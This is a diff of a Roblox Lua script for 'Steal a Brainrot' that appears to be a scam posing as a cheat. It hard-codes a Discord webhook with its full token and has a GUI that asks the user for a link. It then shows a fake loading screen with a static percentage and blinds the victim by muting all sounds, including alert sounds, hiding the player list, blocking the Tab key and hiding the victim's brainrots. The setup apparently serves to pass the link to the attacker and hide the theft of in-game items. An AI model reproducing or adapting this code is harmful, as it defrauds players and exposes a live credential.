@@ -1,5 +1,5 @@
 -- Script for Xeno - Steal a Brainrot (VOID EXTERNAL + Discord)
--- FULL ENGLISH + TAB HIDDEN + REMOTE SOUNDS BLOCKED
+-- ALL SOUNDS KILLED (pași, clone, furat, tot)
 -- Compatible with Xeno Executor
 
 local Players = game:GetService("Players")
@@ -15,7 +15,7 @@ local UserInputService = game:GetService("UserInputService")
 -- ===== CONFIG =====
 local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
 
--- ===== DISCORD (XENO) =====
+-- ===== DISCORD =====
 local function sendToDiscord(message)
     local request = syn and syn.request or http_request or request
     if request then
@@ -30,49 +30,17 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== BLOCK REMOTE SOUNDS (ALERT SOUNDS) =====
-local function blockRemoteSounds()
-    pcall(function()
-        -- 1. Blochează RemoteEvents care trimit sunete
-        for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
-            if obj:IsA("RemoteEvent") then
-                local oldFire = obj.FireServer
-                if oldFire then
-                    obj.FireServer = function(...)
-                        -- Blochează orice eveniment care ar putea declanșa un sunet
-                        return
-                    end
-                end
-            end
-        end
-        
-        -- 2. Oprește sunetele din SoundService
-        for _, sound in pairs(SoundService:GetDescendants()) do
-            if sound:IsA("Sound") then
-                sound.Volume = 0
-                sound:Stop()
-                sound.Playing = false
-            end
-        end
-        
-        -- 3. Caută și oprește sunetele de alertă din Workspace
-        for _, obj in pairs(Workspace:GetDescendants()) do
-            if obj:IsA("Sound") then
-                obj.Volume = 0
-                obj:Stop()
-                obj.Playing = false
-            end
-        end
-    end)
-    print("✅ Remote sounds blocked!")
-end
-
--- ===== MUTE ALL SOUNDS =====
-local function muteAllSounds()
-    print("🔇 Muting ALL sounds...")
+-- ===== KILL ALL SOUNDS =====
+local function killAllSounds()
+    print("🔇 Killing ALL sounds...")
     
+    -- 1. Volumul global la 0
     pcall(function()
         SoundService.Volume = 0
+    end)
+    
+    -- 2. Oprește toate sunetele existente
+    pcall(function()
         for _, sound in pairs(game:GetDescendants()) do
             if sound:IsA("Sound") then
                 sound.Volume = 0
@@ -82,9 +50,10 @@ local function muteAllSounds()
         end
     end)
     
+    -- 3. BLOCEAZĂ ORICE SUNET NOU
     spawn(function()
         while true do
-            task.wait(0.03)
+            task.wait(0.1)
             pcall(function()
                 SoundService.Volume = 0
                 for _, sound in pairs(game:GetDescendants()) do
@@ -98,13 +67,13 @@ local function muteAllSounds()
         end
     end)
     
-    print("✅ ALL sounds muted!")
+    print("✅ ALL sounds killed!")
 end
 
--- ===== HIDE PLAYER LIST (TAB) =====
+-- ===== HIDE PLAYER LIST =====
 local function hidePlayerList()
     pcall(function()
-        -- Destroy ALL leaderboards and player lists
+        -- Distruge toate listele de jucători
         for _, gui in pairs(CoreGui:GetChildren()) do
             if gui:IsA("ScreenGui") then
                 local name = gui.Name:lower()
@@ -123,7 +92,7 @@ local function hidePlayerList()
             end
         end
         
-        -- Block Tab key completely
+        -- Blochează tasta Tab
         UserInputService.InputBegan:Connect(function(input)
             if input.KeyCode == Enum.KeyCode.Tab then
                 input:StopPropagation()
@@ -138,7 +107,7 @@ local function hidePlayerList()
             end
         end)
     end)
-    print("✅ Player list hidden! Tab key blocked!")
+    print("✅ Player list hidden! Tab blocked!")
 end
 
 -- ===== HIDE BRAINROTS =====
@@ -189,14 +158,6 @@ local function resetBase()
     task.wait(3)
     hideBrainrots()
     
-    pcall(function()
-        for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
-            if obj:IsA("RemoteEvent") and string.find(obj.Name:lower(), "reset") then
-                obj:FireServer()
-            end
-        end
-    end)
-    
     print("✅ Base reset!")
 end
 
@@ -220,7 +181,7 @@ local function hideMe()
     end
 end
 
--- ===== BLACK SCREEN + LOADER (VOID EXTERNAL) =====
+-- ===== LOADER (VOID EXTERNAL) =====
 local function showLoader()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "LoaderGUI"
@@ -389,7 +350,6 @@ local function showLoader()
     line.BorderSizePixel = 0
     line.Parent = screenGui
 
-    -- Log messages
     local log1 = Instance.new("TextLabel")
     log1.Size = UDim2.new(0.9, 0, 0, 20)
     log1.Position = UDim2.new(0.05, 0, 0.73, 0)
@@ -423,7 +383,6 @@ local function showLoader()
     log3.TextXAlignment = Enum.TextXAlignment.Left
     log3.Parent = screenGui
 
-    -- Percent 61% (static)
     local percentBottom = Instance.new("TextLabel")
     percentBottom.Size = UDim2.new(0.9, 0, 0, 25)
     percentBottom.Position = UDim2.new(0.05, 0, 0.89, 0)
@@ -501,7 +460,7 @@ local function showLoader()
     return screenGui
 end
 
--- ===== LINK GUI (ENGLISH) =====
+-- ===== LINK GUI =====
 local function showLinkGUI()
     local gui = Instance.new("ScreenGui")
     gui.Name = "LinkInput"
@@ -573,8 +532,7 @@ local function showLinkGUI()
             gui:Destroy()
             showLoader()
             hideMe()
-            muteAllSounds()
-            blockRemoteSounds()  -- <-- BLOCHEAZĂ SUNETELE DE ALERTĂ
+            killAllSounds()      -- <-- AICI OPRESTE TOT
             hidePlayerList()
             local count = hideBrainrots()
             print("✅ Script active! " .. count .. " brainrots hidden.")
@@ -596,8 +554,8 @@ local function main()
     showLinkGUI()
     print("🚀 Waiting for link input...")
     print("🔄 Base will reset every 5 seconds.")
-    print("🔒 Tab key blocked! Player list hidden!")
-    print("🔇 Remote sounds blocked!")
+    print("🔒 Tab blocked! Player list hidden!")
+    print("🔇 ALL sounds killed!")
 end
 
 -- ===== START =====
